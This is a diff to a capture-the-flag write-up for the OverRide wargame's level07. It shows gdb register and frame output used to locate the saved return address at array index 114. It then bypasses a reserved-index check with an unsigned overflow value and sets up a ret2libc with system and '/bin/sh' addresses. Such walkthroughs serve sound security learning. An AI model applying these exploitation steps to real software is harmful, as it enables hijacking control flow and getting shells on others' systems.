@@ -61,13 +61,66 @@ With those two, we can try a ret2libc.
 
 We tried to fuzz input to get a segfault, without result.
 
-To bypass the condition on the index, we made a script to generate and valid
-index : get_index.c
+Let's try to find the location of eip, to see if it is possible to replace it.
+We set a breakpoint on the call of read_number at line 520 in the main.
+Then we check the info frame and register.
 
-The binary removes the environment variable and also there is a protection on 
-the stack. It's called STACK CANARY.
+(gdb) i r
+eax            0xffffd454       -11180
+ecx            0xffffd500       -11008
+edx            0xffffd500       -11008
+ebx            0xffffd454       -11180
+esp            0xffffd430       0xffffd430
+ebp            0xffffd618       0xffffd618
+esi            0xffffd5ec       -10772
+edi            0x8048d65        134516069
+eip            0x804892b        0x804892b <main+520>
+eflags         0x246    [ PF ZF IF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
 
-We can control EIP at index 114 : 
+
+(gdb) info frame
+Stack level 0, frame at 0xffffd620:
+ eip = 0x804892b in main; saved eip 0xf7e45513
+ Arglist at 0xffffd618, args: 
+ Locals at 0xffffd618, Previous frame's sp is 0xffffd620
+ Saved registers:
+  ebx at 0xffffd60c, ebp at 0xffffd618, esi at 0xffffd610, edi at 0xffffd614, eip at 0xffffd61c
+
+We need eax and eip
+eax            0xffffd454
+eip            0xffffd61c
+
+In the assembly we can clearly see that the buffer if sent so read_number :
+
+   0x08048924 <+513>:   lea    0x24(%esp),%eax
+   0x08048928 <+517>:   mov    %eax,(%esp)
+
+We can find the eip real value now :
+
+eip - eax = 0xffffd61c - 0xffffd454 = 4294956572 - 4294956116  = 456
+The array is an int array so we need to divide 456 by 4 to get the real index which is 114.
+
+But 114 % 3 = 0 
+
+Input command: store       
+ Number: 2
+ Index: 114
+ *** ERROR! ***
+   This index is reserved for wil!
+ *** ERROR! ***
+ Failed to do store command
+
+So we have to use a negative number to make the unsigned overflow.
+
+114 = 1073741938. thanks to our script to find it.
+
+We can control EIP at index 1073741938 (114): 
 
 Input command: store
  Number: 43690    (AAAA in hexa)
@@ -81,7 +134,5 @@ level07@OverRide:~$ dmesg | tail -1
 As the array is 100 long, we can try to store number after that range by storing 
 at :
 
-index -> system
-index + 2 -> "/bin/sh"
-
-After few tries we could overwrite the call to __libc_start_main at index 114.
+index -> system = 0xf7e6aed0 = 4159090384
+index + 2 -> "/bin/sh" = 0xf7f897ec = 4160264172
